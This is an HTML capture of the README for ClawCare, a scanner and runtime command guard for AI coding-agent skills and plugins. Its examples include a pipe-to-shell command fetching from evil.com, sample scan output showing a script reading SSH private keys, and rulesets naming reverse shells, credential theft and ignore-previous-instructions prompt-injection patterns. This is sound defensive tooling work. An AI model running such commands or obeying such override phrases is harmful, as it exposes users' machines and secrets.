@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>GitHub - natechensan/ClawCare: Security scanner for AI agent skills and plugins — catch malicious attacks before they execute.</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.55; color: #e2e8f0; max-width: 800px; margin: 26px auto; padding: 0 18px; background: #0a0e27; }
+  h1 { color: #00d9ff; margin-bottom: 0.35em; line-height: 1.22; font-size: clamp(1.45rem, 2.1vw, 1.95rem); font-weight: 700; }
+  h2, h3 { line-height: 1.28; margin: 1.1em 0 0.45em; }
+  .metadata { color: #94a3b8; font-size: 0.86em; margin-bottom: 1.2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 0.7em; }
+  img { max-width: 100%; width: auto !important; height: auto !important; object-fit: contain !important; border-radius: 8px; display: block; margin: 0.6em auto; }
+  a { color: #00d9ff; }
+  p { margin-bottom: 0.72em; line-height: 1.58; }
+  ul, ol { margin: 0.5em 0 0.9em 1.1em; }
+  li { margin: 0.18em 0; }
+  blockquote { border-left: 3px solid #825ee4; padding-left: 12px; margin: 0.8em 0; color: #94a3b8; }
+  code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px; color: #ff79c6; }
+  pre { background: rgba(0,0,0,0.4); padding: 12px; border-radius: 6px; overflow-x: auto; }
+  .article-elevator { position: fixed; right: 14px; bottom: 14px; display: flex; flex-direction: column; gap: 8px; z-index: 9999; }
+  .article-elevator-btn { width: 36px; height: 36px; border: 1px solid rgba(0,217,255,0.35); border-radius: 10px; background: rgba(10,14,39,0.88); color: #00d9ff; cursor: pointer; font-size: 16px; line-height: 1; }
+  .article-elevator-btn:hover { background: rgba(10,14,39,1); }
+  [id*="overlay"], [class*="overlay"], [id*="modal"], [class*="modal"], [id*="popup"], [class*="popup"],
+  [id*="paywall"], [class*="paywall"], [id*="subscribe"], [class*="subscribe"], [id*="cookie"], [class*="cookie"],
+  [id*="consent"], [class*="consent"], [id*="gdpr"], [class*="gdpr"], [role="dialog"], [aria-modal="true"] {
+    display: none !important;
+    visibility: hidden !important;
+    pointer-events: none !important;
+  }
+</style>
+</head>
+<body>
+  <h1>GitHub - natechensan/ClawCare: Security scanner for AI agent skills and plugins — catch malicious attacks before they execute.</h1>
+  <div class="metadata">
+    Source: Hacker News Show | Date: 2/27/2026 7:23:25 AM | <a href="https://github.com/natechensan/ClawCare" target="_blank" rel="noopener noreferrer">Lien</a> | Lang: EN
+  </div>
+  <div class="content">
+    <div><h1>ClawCare</h1><a href="#clawcare"></a></div>
+<p> <a target="_blank" href="https://github.com/natechensan/ClawCare/blob/main/clawcare.png?raw=true" rel="noopener noreferrer"><img src="https://github.com/natechensan/ClawCare/raw/main/clawcare.png?raw=true" alt="ClawCare"></a>
+</p>
+<p><em><strong>Run AI agents with care - OpenClaw, Claude Code and more</strong></em></p>
+<p>ClawCare is a multi-platform security tool to prevent AI agent skills, plugins and instructions from attacks. It scans and reports supply-chain threats like command injection, credential theft, and data exfiltration. It also provides <strong>runtime command interception</strong> (ClawCare Guard) that blocks dangerous commands before they execute. Use it as a CLI tool, integrate into CI/CD, or install as a hook/plugin for your agent platform.</p>
+<p><a href="https://docs.openclaw.ai/tools/plugin"><img src="https://camo.githubusercontent.com/237ed95479fca344a2dde3a3886b3d7bcd120efb6e3be91a615113ac9f56a4f5/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4f70656e436c61772d706c7567696e2d626c75653f6c6f676f3d646174613a696d6167652f7376672b786d6c3b6261736536342c50484e325a79423462577875637a30696148523063446f764c336433647935334d793576636d63764d6a41774d43397a646d636949485a705a58644362336739496a41674d4341794e4341794e4349675a6d6c73624430696432687064475569506a786a61584a6a6247556759336739496a45794969426a655430694d54496949484939496a45774969382b5043397a646d632b" alt="OpenClaw"></a>
+<a href="https://docs.anthropic.com/en/docs/claude-code"><img src="https://camo.githubusercontent.com/e577c42c0eebb72f98a606cd93bf8578124d8dff2fb11ee32b5e7ac23b2da1c1/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f436c617564655f436f64652d686f6f6b732d626c756576696f6c65743f6c6f676f3d616e7468726f706963266c6f676f436f6c6f723d7768697465" alt="Claude Code"></a>
+<a href="https://github.com/openai/codex"><img src="https://camo.githubusercontent.com/8a0d5e1ae2cbc95b50b10e734dbaf8d9b4d4b768411351a469e43154f13db27b/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f436f6465782d737570706f727465642d677265656e3f6c6f676f3d6f70656e6169266c6f676f436f6c6f723d7768697465" alt="Codex"></a>
+<a href="https://www.cursor.com/"><img src="https://camo.githubusercontent.com/86f65c2a7dac4a45ce96735f890b8f1f886d638d4ddcfc1dffbbc33cff7ae591/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f437572736f725f4167656e742d737570706f727465642d6f72616e67653f6c6f676f3d637572736f72266c6f676f436f6c6f723d7768697465" alt="Cursor"></a>
+<a href="/natechensan/ClawCare/blob/main/LICENSE"><img src="https://camo.githubusercontent.com/1ab9a52ead0f56e125b9f9fd7a0b2bc19d44f714b328394014be01e48af0fb3a/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d4170616368655f322e302d7265642e737667" alt="License"></a>
+<a href="https://www.python.org/"><img src="https://camo.githubusercontent.com/d8427d96018083c27e44cdf667ec66f4a83f24a0c1645c426a4c8f7c9ba7afbb/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f507974686f6e2d332e31302b2d79656c6c6f773f6c6f676f3d707974686f6e266c6f676f436f6c6f723d7768697465" alt="Python"></a></p>
+<div><h2>Why</h2><a href="#why"></a></div>
+<p>AI coding agents (Claude Code, Cursor, Codex, OpenClaw) let you install third-party skills and plugins that can read your files, run commands, access secrets and extract sensitive data. A malicious skill can:</p>
+<ul>
+<li>Pipe remote scripts into your shell (<pre><code>curl ... | bash</code></pre>)</li>
+<li>Steal SSH keys and API tokens</li>
+<li>Set up cron persistence</li>
+<li>Transfer PII data to external servers</li>
+</ul>
+<p>ClawCare catches these patterns <strong>before</strong> they run — both statically (scanning files) and at runtime (intercepting commands) — and gives you full visibility into the risks.</p>
+<div><h2>Demo</h2><a href="#demo"></a></div>
+<p>See ClawCare in action:</p>
+<p> <strong><a href="https://github.com/natechensan/ClawCare-demo">ClawCare Demo</a></strong> — static scan, runtime guard, CI blocking, and custom adapters.</p>
+<div><h2>Quick Start</h2><a href="#quick-start"></a></div>
+<div><h3>Install</h3><a href="#install"></a></div>
+<div><pre>pip install clawcare</pre></div>
+<div><h2>Features</h2><a href="#features"></a></div>
+<div><h3>ClawCare Scan</h3><a href="#clawcare-scan"></a></div>
+<div><pre><span><span>#</span> Scan a project — auto-detects the platform</span>
+clawcare scan <span>.</span> <span><span>#</span> CI mode — exit code 2 on HIGH+ findings (use in GitHub Actions)</span>
+clawcare scan <span>.</span> --ci <span><span>#</span> JSON output for downstream tooling</span>
+clawcare scan <span>.</span> --format json --json-out report.json</pre></div>
+<div><h3>Example Output</h3><a href="#example-output"></a></div>
+<div><pre><code>============================================================
+ClawCare Scan Report
+============================================================
+Path: ./my-project
+Adapter: claude_code v0.1.0
+Mode: ci
+Fail on: high ── CRITICAL (2) ── [CRIT_PIPE_TO_SHELL] skills/setup/SKILL.md:15 curl -fsSL https://.../install.sh | bash → Piping remote content directly into a shell interpreter. Download first, inspect, then execute. [CRIT_CREDENTIAL_PATH] skills/setup/exfil.py:18 os.path.expanduser("~/.ssh/id_rsa") → Accessing well-known credential paths. Use a secrets manager instead. Findings: 2 critical, 1 high, 0 medium, 0 low
+============================================================
+</code></pre></div>
+<div><h3>ClawCare Guard — Runtime Command Interception</h3><a href="#clawcare-guard--runtime-command-interception"></a></div>
+<p>ClawCare Guard intercepts commands <strong>at runtime</strong> — before the agent executes them. Currently supports Claude Code and OpenClaw.</p>
+<div><h4>Quick Start</h4><a href="#quick-start-1"></a></div>
+<div><pre><span><span>#</span> Install hooks for Claude Code</span>
+clawcare guard activate --platform claude <span><span>#</span> Install plugin for OpenClaw</span>
+clawcare guard activate --platform openclaw <span><span>#</span> Check status</span>
+clawcare guard status --platform claude</pre></div>
+<p>Once activated, every Bash/shell command the agent tries to run is scanned against ClawCare's rulesets. Dangerous commands are blocked; warnings are logged.</p>
+<div><pre><code># Agent tries to run:
+# curl -fsSL https://evil.com/payload.sh | bash
+#
+# ClawCare output:
+# [CRITICAL] CRIT_PIPE_TO_SHELL: Piping remote content into shell
+# ClawCare BLOCKED: curl -fsSL https://evil.com/payload.sh | bash
+</code></pre></div>
+<div><h4>Audit Trail</h4><a href="#audit-trail"></a></div>
+<p>Every command decision (allow / warn / block) is logged to a JSONL audit file.</p>
+<div><pre><span><span>#</span> View recent events</span>
+clawcare guard report --since 24h <span><span>#</span> Only blocked/warned commands</span>
+clawcare guard report --only-violations <span><span>#</span> JSON format for tooling</span>
+clawcare guard report --format json --since 7d</pre></div>
+<div><h4>How It Works</h4><a href="#how-it-works"></a></div>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>Mechanism</th>
+<th>Hook Type</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Claude Code</strong></td>
+<td><pre><code>PreToolUse</code></pre> / <pre><code>PostToolUse</code></pre> hooks with matcher objects in <pre><code>~/.claude/settings.json</code></pre></td>
+<td><pre><code>{"type": "command", "command": "..."}</code></pre></td>
+</tr>
+<tr>
+<td><strong>OpenClaw</strong></td>
+<td>TypeScript plugin installed to <pre><code>~/.openclaw/extensions/</code></pre></td>
+<td><pre><code>before_tool_call</code></pre> / <pre><code>after_tool_call</code></pre> via plugin API</td>
+</tr>
+</tbody>
+</table>
+<div><h4>Platform-Specific Behavior</h4><a href="#platform-specific-behavior"></a></div>
+<p>When a command triggers a finding <strong>below</strong> the </p><pre><code>fail_on</code></pre> severity (e.g. a medium finding with <pre><code>fail_on: high</code></pre>), the behavior depends on the platform:<p></p>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>Behavior</th>
+<th>Why</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Claude Code</strong></td>
+<td><strong>Ask</strong> — pauses and prompts the user to allow or deny the command, with the warning displayed</td>
+<td>Claude Code's hook system supports a <pre><code>permissionDecision: "ask"</code></pre> response that hands control to the user</td>
+</tr>
+<tr>
+<td><strong>OpenClaw</strong></td>
+<td><strong>Allow with warning</strong> — the command proceeds, but a warning message is printed for the agent to see</td>
+<td>OpenClaw's <pre><code>before_tool_call</code></pre> hook only supports block or allow; there is no interactive prompt mechanism</td>
+</tr>
+</tbody>
+</table>
+<p>Commands at or above </p><pre><code>fail_on</code></pre> severity are <strong>blocked</strong> on both platforms.<p></p>
+<div><h4>Deactivate</h4><a href="#deactivate"></a></div>
+<div><pre>clawcare guard deactivate --platform claude
+clawcare guard deactivate --platform openclaw</pre></div>
+<hr>
+<div><h3>Platform Adapters for Claude Code, OpenClaw, Codex and Cursor Agent Skills</h3><a href="#platform-adapters-for-claude-code-openclaw-codex-and-cursor-agent-skills"></a></div>
+<p>Auto-detects the AI agent platform and scans the right files:</p>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>Scans</th>
+<th>Detection</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Claude Code</strong></td>
+<td><pre><code>.claude/skills/*/SKILL.md</code></pre> + code</td>
+<td><pre><code>.claude-plugin/</code></pre>, <pre><code>SKILL.md</code></pre></td>
+</tr>
+<tr>
+<td><strong>Cursor</strong></td>
+<td><pre><code>.cursor/rules/*.mdc</code></pre>, <pre><code>.cursorrules</code></pre> + skills</td>
+<td><pre><code>.cursor/</code></pre> directory</td>
+</tr>
+<tr>
+<td><strong>Codex</strong></td>
+<td><pre><code>AGENTS.md</code></pre>, <pre><code>AGENTS.override.md</code></pre> + skills</td>
+<td><pre><code>AGENTS.md</code></pre></td>
+</tr>
+<tr>
+<td><strong>OpenClaw</strong></td>
+<td><pre><code>SKILL.md</code></pre> + code in skill directories</td>
+<td><pre><code>.opencode/</code></pre></td>
+</tr>
+</tbody>
+</table>
+<p>All following the file structure of the respective AI agent platforms.</p>
+<p>Only plugin and skill files are scanned — your application code, README, and CI configs are never touched.</p>
+<div><h3>Configuration</h3><a href="#configuration"></a></div>
+<p>All settings for both <strong>scan</strong> and <strong>guard</strong> live in one file: </p><pre><code>.clawcare.yml</code></pre>.<p></p>
+<div><h4>Resolution Order</h4><a href="#resolution-order"></a></div>
+<p>ClawCare resolves configuration in priority order:</p>
+<table>
+<thead>
+<tr>
+<th>Priority</th>
+<th>Location</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1 (highest)</td>
+<td>CLI flags</td>
+<td>One-off overrides</td>
+</tr>
+<tr>
+<td>2</td>
+<td><pre><code>.clawcare.yml</code></pre> in project root</td>
+<td>Team policy, checked into version control</td>
+</tr>
+<tr>
+<td>3</td>
+<td><pre><code>~/.clawcare/config.yml</code></pre></td>
+<td>Personal defaults across all projects</td>
+</tr>
+<tr>
+<td>4 (lowest)</td>
+<td>Built-in defaults</td>
+<td>Sane zero-config behavior</td>
+</tr>
+</tbody>
+</table>
+<p>Project-level values override user-level values. CLI flags override both.</p>
+<div><h4>Full Reference</h4><a href="#full-reference"></a></div>
+<p>Drop a </p><pre><code>.clawcare.yml</code></pre> in your project (or <pre><code>~/.clawcare/config.yml</code></pre> for global defaults):<p></p>
+<div><pre><span><span>#</span> .clawcare.yml — project-level config (or ~/.clawcare/config.yml for personal defaults)</span>
+<span>scan</span>: <span>fail_on</span>: <span>high </span><span><span>#</span> minimum severity to block CI (critical | high | medium | low)</span> <span>block_local</span>: <span>false </span><span><span>#</span> block locally too? (default: warn only)</span> <span>ignore_rules</span>: - <span>MED_JS_EVAL </span><span><span>#</span> suppress specific rules</span> <span>exclude</span>: - <span><span>"</span>vendor/**<span>"</span></span> <span><span>#</span> skip directories</span> <span>max_file_size_kb</span>: <span>512</span> <span><span>#</span> skip large files</span> <span>rulesets</span>: - <span>default </span><span><span>#</span> built-in rules (always included)</span> - <span>./my-custom-rules </span><span><span>#</span> add your own</span> <span>guard</span>: <span>fail_on</span>: <span>high </span><span><span>#</span> minimum severity to block commands (low | medium | high | critical)</span> <span>audit</span>: <span>enabled</span>: <span>true</span> <span>log_path</span>: <span><span>"</span>~/.clawcare/history.jsonl<span>"</span></span></pre></div>
+<p>CLI flags override config values. Excludes and rulesets from both sources merge.</p>
+<div><h3>Policy Manifests</h3><a href="#policy-manifests"></a></div>
+<p>Skills/Plugins can declare their permissions in a </p><pre><code>clawcare.manifest.yml</code></pre>:<p></p>
+<div><pre><span>permissions</span>: <span>exec</span>: <span>none </span><span><span>#</span> no shell execution</span> <span>network</span>: <span>allowlist </span><span><span>#</span> only listed domains</span> <span>filesystem</span>: <span>read_only</span> <span>secrets</span>: <span>none</span> <span>persistence</span>: <span>forbidden</span> <span>allowed_domains</span>: - <span>api.anthropic.com</span></pre></div>
+<p>ClawCare enforces these declarations — violations appear as HIGH/CRITICAL findings.</p>
+<div><h3>Custom Rulesets</h3><a href="#custom-rulesets"></a></div>
+<p>Create your own rules as YAML:</p>
+<div><pre><span>rules</span>: - <span>id</span>: <span>MY_NO_INTERNAL_URLS</span> <span>pattern</span>: <span><span>"</span>https://internal<span>\\</span>.corp<span>\\</span>.com<span>"</span></span> <span>severity</span>: <span>high</span> <span>description</span>: <span><span>"</span>References to internal URLs should not appear in extensions.<span>"</span></span> <span>recommendation</span>: <span><span>"</span>Use environment variables for internal endpoints.<span>"</span></span></pre></div>
+<p>Place in a folder, then: </p><pre><code>clawcare scan . --ruleset ./my-rules</code></pre><p></p>
+<div><h3>Custom Adapters</h3><a href="#custom-adapters"></a></div>
+<p>ClawCare supports custom adapters for scanning any AI agent platform. An adapter implements four methods:</p>
+<div><pre><span># my_adapter.py</span>
+<span>from</span> <span>clawcare</span>.<span>models</span> <span>import</span> <span>ExtensionRoot</span> <span>class</span> <span>MyAdapter</span>: <span>name</span> <span>=</span> <span>"my_platform"</span> <span>version</span> <span>=</span> <span>"0.1.0"</span> <span>priority</span> <span>=</span> <span>50</span> <span>def</span> <span>detect</span>(<span>self</span>, <span>target_path</span>: <span>str</span>) <span>-&gt;</span> <span>float</span>: <span>"""Return 0.0–1.0 confidence that this adapter applies."""</span> ... <span>def</span> <span>discover_roots</span>(<span>self</span>, <span>target_path</span>: <span>str</span>) <span>-&gt;</span> <span>list</span>[<span>ExtensionRoot</span>]: <span>"""Return extension roots to scan."""</span> ... <span>def</span> <span>scan_scope</span>(<span>self</span>, <span>root</span>: <span>ExtensionRoot</span>) <span>-&gt;</span> <span>dict</span>: <span>"""Return include/exclude globs for this root."""</span> <span>return</span> { <span>"include_globs"</span>: [<span>"*.md"</span>, <span>"*.py"</span>, <span>"*.yml"</span>], <span>"exclude_globs"</span>: [<span>".git"</span>, <span>"node_modules"</span>], } <span>def</span> <span>default_manifest</span>(<span>self</span>, <span>root</span>: <span>ExtensionRoot</span>) <span>-&gt;</span> <span>str</span> <span>|</span> <span>None</span>: <span>"""Return path to clawcare.manifest.yml, or None."""</span> <span>return</span> <span>None</span></pre></div>
+<p>Use it via import string:</p>
+<div><pre>clawcare scan path/ --adapter import:my_adapter:MyAdapter</pre></div>
+<p>Or register permanently via entry point in your </p><pre><code>pyproject.toml</code></pre>:<p></p>
+<div><pre>[<span>project</span>.<span>entry-points</span>.<span>"clawcare</span>.<span>adapters"</span>]
+<span>my_platform</span> = <span><span>"</span>my_adapter:MyAdapter<span>"</span></span></pre></div>
+<p>See <a href="/natechensan/ClawCare/blob/main/clawcare/adapters/base.py"></a></p><pre><a href="/natechensan/ClawCare/blob/main/clawcare/adapters/base.py"><code>clawcare/adapters/base.py</code></a></pre> for the full protocol, or any of the <a href="/natechensan/ClawCare/blob/main/clawcare/integrations">built-in adapters</a> for real examples.<p></p>
+<div><h3>Built-in Rules</h3><a href="#built-in-rules"></a></div>
+<p>Three rulesets ship by default, organized by attack category:</p>
+<table>
+<thead>
+<tr>
+<th>Ruleset</th>
+<th>Catches</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><pre><code>execution-abuse</code></pre></td>
+<td>Pipe-to-shell, reverse shells, credential theft, persistence, destructive commands, subprocess abuse</td>
+</tr>
+<tr>
+<td><pre><code>data-exfiltration</code></pre></td>
+<td>Hardcoded AWS keys, SSH keys, API tokens, SSN/credit card numbers, IP addresses, env-variable exfiltration</td>
+</tr>
+<tr>
+<td><pre><code>prompt-injection</code></pre></td>
+<td>Instruction override, role hijacking, ignore-previous-instructions patterns</td>
+</tr>
+</tbody>
+</table>
+<p>All rules include <a href="https://cwe.mitre.org/">CWE</a> references where applicable. Rules are used by both the static scanner and the runtime guard.</p>
+<div><h2>CI Integration</h2><a href="#ci-integration"></a></div>
+<div><h3>GitHub Actions</h3><a href="#github-actions"></a></div>
+<div><pre>- <span>name</span>: <span>Install ClawCare</span> <span>run</span>: <span>pip install clawcare</span> - <span>name</span>: <span>Scan for malicious extensions</span> <span>run</span>: <span>clawcare scan . --ci</span></pre></div>
+<div><h2>CLI Reference</h2><a href="#cli-reference"></a></div>
+<div><pre><code>clawcare scan &lt;path&gt; [OPTIONS] Options: --ci CI mode (exit 2 on findings above threshold) --fail-on SEVERITY Minimum severity to block: critical|high|medium|low (default: high) --block-local Block locally too (default: warn only, exit 0) --format FORMAT Output format: text|json (default: text) --json-out FILE Write JSON report to file --adapter NAME Force a specific adapter (default: auto-detect) --ruleset PATH Additional rulesets (repeatable) --exclude GLOB Exclude glob patterns (repeatable) --max-file-size-kb N Skip files larger than N KB --manifest MODE Manifest enforcement: auto|skip|strict (default: auto) clawcare adapters list List registered adapters
+</code></pre></div>
+<div><h3>Guard CLI</h3><a href="#guard-cli"></a></div>
+<div><pre><code>clawcare guard run -- &lt;COMMAND&gt; Scan and execute a command (wrapper mode) --fail-on SEVERITY Minimum severity to block (default: from config or high) --dry-run Scan only — do not execute --config PATH Path to guard config file clawcare guard activate Install hooks/plugin for a platform --platform claude|openclaw --settings PATH Path to settings file (auto-detected if omitted) --project Install at project level (Claude only) clawcare guard deactivate Remove hooks/plugin --platform claude|openclaw clawcare guard status Check whether hooks are installed --platform claude|openclaw clawcare guard report Query audit history --since DURATION Relative time (e.g. 24h, 30m, 7d) or ISO timestamp --only-violations Show only events with findings --format text|json Output format (default: text) --limit N Max events to show (default: 100) --log-path PATH Override audit log path clawcare guard hook (internal) Handle a platform hook event --platform claude|openclaw --stage pre|post
+</code></pre></div>
+<div><h2>Contributing</h2><a href="#contributing"></a></div>
+<p>See <a href="/natechensan/ClawCare/blob/main/CONTRIBUTING.md">CONTRIBUTING.md</a> for development instructions.</p>
+<div><h2>License</h2><a href="#license"></a></div>
+<p><a href="/natechensan/ClawCare/blob/main/LICENSE">Apache 2.0</a></p>
+  </div>
+  <div class="article-elevator" aria-label="Navigation article">
+    <button class="article-elevator-btn" type="button" onclick="scrollToTop()">▲</button>
+    <button class="article-elevator-btn" type="button" onclick="scrollToBottom()">▼</button>
+  </div>
+  <script>
+    function stripBlockingPanels() {
+      const selector = '[id*="overlay"], [class*="overlay"], [id*="modal"], [class*="modal"], [id*="popup"], [class*="popup"], [id*="paywall"], [class*="paywall"], [id*="subscribe"], [class*="subscribe"], [id*="cookie"], [class*="cookie"], [id*="consent"], [class*="consent"], [id*="gdpr"], [class*="gdpr"], [role="dialog"], [aria-modal="true"]';
+      const textPattern = /\b(cookie|consent|gdpr|subscribe|subscription|paywall|abonnez[-\s]?vous|inscrivez[-\s]?vous|continue reading|continuez la lecture)\b/i;
+      document.querySelectorAll(selector).forEach((node) => node.remove());
+      document.querySelectorAll('div, section, aside').forEach((node) => {
+        const styleAttr = String(node.getAttribute('style') || '').toLowerCase();
+        const classAndId = String(node.className || '').toLowerCase() + ' ' + String(node.id || '').toLowerCase();
+        const text = String(node.textContent || '').slice(0, 800);
+        const hasKeyword = textPattern.test(classAndId) || textPattern.test(text);
+        const looksFixed = /(position\s*:\s*(fixed|sticky)|inset\s*:|top\s*:|left\s*:|right\s*:|bottom\s*:)/.test(styleAttr);
+        const hasPriority = /(z-index\s*:\s*[1-9]\d{1,}|backdrop-filter|overflow\s*:\s*hidden)/.test(styleAttr);
+        if (hasKeyword && (looksFixed || hasPriority)) node.remove();
+      });
+    }
+    function scrollToTop() {
+      window.scrollTo({ top: 0, behavior: 'auto' });
+    }
+    function scrollToBottom() {
+      window.scrollTo({ top: document.documentElement.scrollHeight, behavior: 'auto' });
+    }
+    window.addEventListener('message', (event) => {
+      const data = event && event.data;
+      if (!data || data.type !== 'AI_PULSE_SCROLL') return;
+      if (data.direction === 'up' || data.direction === 'top') scrollToTop();
+      if (data.direction === 'down' || data.direction === 'bottom') scrollToBottom();
+    });
+    stripBlockingPanels();
+    setTimeout(stripBlockingPanels, 60);
+    setTimeout(stripBlockingPanels, 220);
+    setTimeout(stripBlockingPanels, 650);
+  </script>
+</body>
+</html>
